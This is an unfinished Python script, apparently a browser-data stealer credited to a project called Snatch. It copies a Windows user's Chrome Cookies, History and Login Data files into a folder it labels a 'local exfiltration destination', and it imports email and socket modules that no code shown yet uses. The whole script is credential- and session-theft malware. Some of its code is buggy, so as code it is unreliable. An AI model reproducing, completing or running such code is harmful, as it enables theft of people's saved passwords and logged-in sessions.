#WIP

import os
import errno
import shutil
import socket
import base64
import smtplib
import getpass

"""Creds to https://github.com/mehulj94/Snatch"""

cookieDir = "C:\Users\Public\Intel\Logs" #Local exfiltration destination
usr = getpass.getuser()

os.makedirs(cookieDir) 

def bacon():
	cookiepath = 'C://Users//' + usr + '//AppData//Local//Google//Chrome//User Data//Default//'

	copycookie = cookiepath + "//Cookies" 
	copyhistory = cookiepath + "//History" 
	copyLoginData = cookiepath + "//Login Data" 

	filesindir = os.listdir(cookieDir) #If we haven't already, copy the contents of each dir into our new one

	if copycookie not in filesindir:
		try:
			shutil.copy2(copycookie, cookieDir)
		except:
			pass
	else:
		pass
		
	if copyhistory not in filesindir:
		try:
			shutil.copy2(copyhistory, cookieDir)
		except:
			pass
	else:
		pass
	
	if copyLoginData not in filesindir:
		try:
			shutil.copy2(copyLoginData, cookieDir)
		except:
			pass
	else:
		pass
		
	return True



"""
req = requests.get("https://google.com")

cookie = req.cookies
"""